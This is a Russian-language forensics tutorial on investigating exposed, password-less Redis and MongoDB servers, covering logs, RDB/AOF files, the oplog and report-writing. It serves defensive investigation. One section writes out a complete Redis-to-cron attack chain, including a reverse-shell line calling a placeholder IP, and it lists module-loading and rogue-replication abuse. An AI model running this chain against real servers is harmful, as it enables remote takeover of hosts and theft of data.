## Вопрос, с которого всё начинается

Приложение использует MongoDB/Redis, и что-то пошло не так. Оба часто выставляют
наружу без пароля. Разберём, где следы.

## Наш пример: Redis

## Шаг 1: открытый доступ

Redis без пароля:

```
$ redis-cli -h target INFO server | head
redis_version:6.2.0
```

Ответ без `AUTH` — открытый инстанс. MongoDB проверяется `mongosh --host target`.

## Шаг 2: Redis-эксплуатация

Redis известен записью файлов (RCE через SSH-ключ/cron):

```
$ redis-cli -h target CONFIG GET dir
dir /var/spool/cron
```

`dir` в `/var/spool/cron` + `SET`/`SAVE` = запись cron-файла → RCE. В логах Redis:

```
$ grep -i 'CONFIG\|SAVE\|BGSAVE' /var/log/redis/redis-server.log
```

## Шаг 3: MongoDB

MongoDB без авторизации даёт доступ к БД:

```
$ mongosh --host target
> show dbs
admin  appdb
> db.appdb.users.find()
```

Утечка пользователей/паролей — типичный итог.

## Шаг 4: следы изменений

- новые БД/коллекции (загруженные данные);
- удаление коллекций (anti-forensics);
- `oplog` (журнал операций) MongoDB — история изменений;
- RDB/AOF-файлы Redis — история данных.

## Шаг 5: что искать

- доступ с внешних IP;
- `CONFIG`/`SAVE` в Redis (запись файлов);
- новые пользователи/БД;
- удалённые коллекции;
- oplog/AOF как источник истории.

## Что мы теперь знаем

- Redis/Mongo часто без пароля.
- Redis CONFIG+SAVE = запись файлов (RCE).
- Mongo без авторизации даёт доступ к данным.
- oplog/AOF — история изменений.
- Ищем внешний доступ и изменения.

## Если не сработало

- Пароль есть? Ищи его в конфиге приложения.
- Логи выключены? Смотри сеть/аудит ОС.
- Данные удалены? Восстанавливай из RDB/oplog.

## Redis: больше, чем RCE

Redis — не только хранилище. Атакующие используют его возможности:

- **запись файлов** — `CONFIG SET dir` + `SET`/`SAVE` позволяет писать в произвольный
  путь: SSH-ключ в `~/.ssh/authorized_keys`, cron-файл, webshell;
- **загрузка модулей** — `MODULE LOAD` исполняет произвольный `.so` на хосте (RCE);
- **репликация** — `SLAVEOF`/`REPLICAOF` на контролируемый «мастер» позволяет вытащить
  данные или подсунуть модуль;
- **Lua-скрипты** — `EVAL` исполняет Lua с доступом к `redis.call`;
- **открытые ключи** — `KEYS *` показывает всё содержимое.

Форензик-вывод: в логах Redis ищи `CONFIG`, `SAVE`, `BGSAVE`, `MODULE`, `SLAVEOF`,
`EVAL` — это действия, которых не должно быть при нормальной работе.

## Redis-форензика: RDB и AOF

Redis персистит данные двумя способами:

- **RDB** — бинарные снапшоты (точки во времени); имя по умолчанию `dump.rdb`;
- **AOF** — журнал команд (append-only file), где записана каждая операция.

```
$ redis-check-rdb /var/lib/redis/dump.rdb
$ head -c 200 /var/lib/redis/appendonly.aof
```

RDB даёт снимок состояния, AOF — историю команд (то, что нужно для таймлайна). Если
данные «пропали», их можно восстановить из RDB или прокрутить AOF. Место хранения
определяется `dir`/`dbfilename` в конфиге — проверь, не менял ли их атакующий.

## MongoDB: следы в файлах

MongoDB (движок WiredTiger) хранит данные в файлах `collection-*.wt` и журнале
`WiredTigerLog`/`journal`. Полезные артефакты:

- **`oplog.rs`** (коллекция в `local`) — журнал операций репликации: история
  вставок/обновлений/удалений;
- **`diagnostic.data`** — метрики и события сервера;
- **профилировщик** — `system.profile` пишет медленные/все операции (если включён);
- **audit log** — если включён, фиксирует аутентификацию и команды.

```
$ mongosh --host target
> use local; db.oplog.rs.find().sort({$natural:-1}).limit(5)
> use appdb; db.system.profile.find().limit(5)
```

По oplog видно, кто и когда менял данные; по профилировщику — подозрительные запросы.

## Аудит и профилирование

- **Redis** — `redis-cli MONITOR` (в реальном времени), лог-файл (`redis-server.log`),
  `INFO` (версия, конфиг, клиенты);
- **MongoDB** — audit log (Enterprise) и profiler (Community), `db.currentOp()`;
- **сетевой уровень** — кто подключался (netstat/логи ОС).

Если логи выключены, единственный путь — сетевой аудит ОС и RDB/AOF/oplog как «слепки»
истории. Поэтому в отчёте всегда указывай, какие источники были доступны.

## Практический разбор

Из приложения пропали данные, БД Redis/Mongo торчит наружу. Ход:

1. Проверяем открытость: `redis-cli -h target INFO` без `AUTH`; `mongosh` без логина.
2. Redis: ищем в логах `CONFIG`/`SAVE`/`MODULE` — признак записи файлов/RCE.
3. Смотрим `dir`/`dbfilename` — не изменены ли.
4. Mongo: `oplog.rs` — история операций; ищем `drop`/`delete` (anti-forensics).
5. Проверяем `system.profile` на подозрительные запросы.
6. Сетевой аудит: внешние IP, время.
7. Фиксируем найденное со ссылками на логи/файлы.

Так восстанавливается, что и кто делал с БД.

## Частые ошибки

- **Считать отсутствие пароля «нормой».** Открытый Redis/Mongo — уязвимость, а не
  настройка по умолчанию.
- **Игнорировать AOF/oplog.** Это главный источник истории.
- **Путать RDB и AOF.** RDB — снимок, AOF — журнал команд.
- **Забыть про `dir`/`dbfilename`.** Атакующий меняет их для записи файлов.
- **Не проверять сетевой доступ.** Внешние подключения — ключевой признак.

## Что писать в отчёте

Версии Redis/MongoDB, факт отсутствия/наличия аутентификации, изменённые параметры
(`dir`, `dbfilename`), найденные опасные команды (CONFIG/SAVE/MODULE/SLAVEOF),
историю из AOF/oplog, результаты профилирования и сетевые подключения. Каждый вывод —
со ссылкой на лог/файл. Отметь, какие логи были выключены и что осталось вне охвата.

## Redis: разбор конфигурации и следов

Redis-конфиг (`redis.conf`) определяет, куда пишутся данные и как включается защита.
Форензик-значимые параметры:

- `bind` — на каких интерфейсах слушает (0.0.0.0 = наружу);
- `protected-mode` — защита от внешнего доступа без пароля;
- `requirepass` — пароль (отсутствие = открытый доступ);
- `dir`/`dbfilename` — путь и имя RDB-файла (атакующий меняет для записи файлов);
- `appendonly`/`appendfilename` — AOF-журнал;
- `rename-command` — переименование опасных команд (редкая защита).

```
$ redis-cli -h target CONFIG GET dir
$ redis-cli -h target CONFIG GET requirepass
$ redis-cli -h target INFO server
```

Если `CONFIG GET` работает без `AUTH` — инстанс открыт. Изменение `dir` в логах —
сильный признак попытки записи файла на хост.

## MongoDB: структура и восстановление

MongoDB хранит данные в каталоге `dbPath` (по умолчанию `/var/lib/mongodb`). Ключевые
файлы:

- `collection-*.wt` / `index-*.wt` — данные и индексы (WiredTiger);
- `WiredTiger`, `WiredTigerLog*` — движок и журнал;
- `diagnostic.data/*` — метрики;
- `local/oplog.rs` — журнал операций (в репликации).

Восстановление: остановить сервер, скопировать каталог, поднять на отдельном хосте (не
на «боевом»). Удалённые коллекции иногда можно восстановить из журнала WiredTiger или
из oplog. `mongodump`/`mongorestore` — штатные средства, но для удалённого нужен
журнал.

## Мини-чек-лист расследования БД

1. Проверь доступ без аутентификации.
2. Зафиксируй версию (`INFO server`, `db.version()`).
3. Проверь конфиг (`dir`, `bind`, `requirepass`; `dbPath`).
4. Ищи опасные команды в логах (CONFIG/SAVE/MODULE/SLAVEOF; drop/delete).
5. Изучи AOF (Redis) и oplog (Mongo) как историю.
6. Проверь профилировщик/аудит.
7. Собери сетевые подключения.
8. Задокументируй каждый вывод.

## Ограничения и подводные камни

- **Логи могут быть отключены.** Тогда работаешь по AOF/oplog и сетевому аудиту.
- **AOF/RDB перезаписываются.** Сразу копируй файлы, пока не зациклились.
- **oplog ограничен размером.** Старые операции вытесняются — успей прочитать.
- **Профилировщик замедляет БД.** Его часто выключают, поэтому данных нет.
- **RCE через Redis не всегда оставляет явный след.** Ищи косвенные: изменённый `dir`,
  новые файлы в `~/.ssh`/cron.

БД — это хост: после доступа к ней переходи к анализу ОС (пользователи, cron, ключи),
потому что компромисс сервиса часто означает компромисс машины.

## Практический пример: Redis → RCE

Классическая цепочка атаки на открытый Redis:

1. Проверка доступа: `redis-cli -h target INFO` без `AUTH`.
2. Установка пути: `redis-cli -h target CONFIG SET dir /var/spool/cron/`.
3. Запись «данных»: `redis-cli -h target SET x "\n\n*/5 * * * * root bash -i >& /dev/tcp/203.0.113.5/4444 0>&1\n\n"`.
4. Сохранение: `redis-cli -h target SAVE` — Redis пишет RDB-файл по указанному пути.
5. Cron подхватывает файл → reverse shell.

Форензик-следы: в логах Redis — `CONFIG SET dir`, `SAVE`; в файловой системе — файл
`dump.rdb` в необычном каталоге; в cron — подозрительная запись; в логах ОС — новый
процесс/соединение. Так по «сервисным» следам восстанавливают путь атаки.

## Ключевой вывод

Redis и MongoDB часто выставляют наружу без пароля — это делает их и лёгкой целью, и
важным источником артефактов. Redis-следы (`CONFIG`/`SAVE`/`MODULE`), AOF-журнал,
oplog MongoDB, профилировщик и сетевые логи позволяют восстановить, что и кто делал с
базой. Помни: база данных — это хост; после доступа к сервису анализируй и саму машину
(пользователи, cron, ключи, автозапуск), потому что компромисс сервиса часто означает
компромисс хоста.

## Что важно помнить

Redis и MongoDB — не только цель, но и источник доказательств. Открытый доступ — сам по
себе находка; опасные команды (CONFIG/SAVE/MODULE/SLAVEOF) и операции drop/delete —
следы атаки. AOF-журнал Redis и oplog MongoDB дают историю изменений. И не забывай:
после доступа к базе исследуй и саму машину — компромисс сервиса часто означает
компромисс хоста.

## Доказательная ценность

Для суда важна не только находка, но и её проверяемость. Указывай, из какого файла или
лога извлечён факт, приводи фрагмент и команду. AOF/oplog — это машинно-читаемая
история, её можно предъявить; интерпретацию («это был RCE») подкрепляй цепочкой
следов: CONFIG dir → SAVE → файл в cron → процесс.
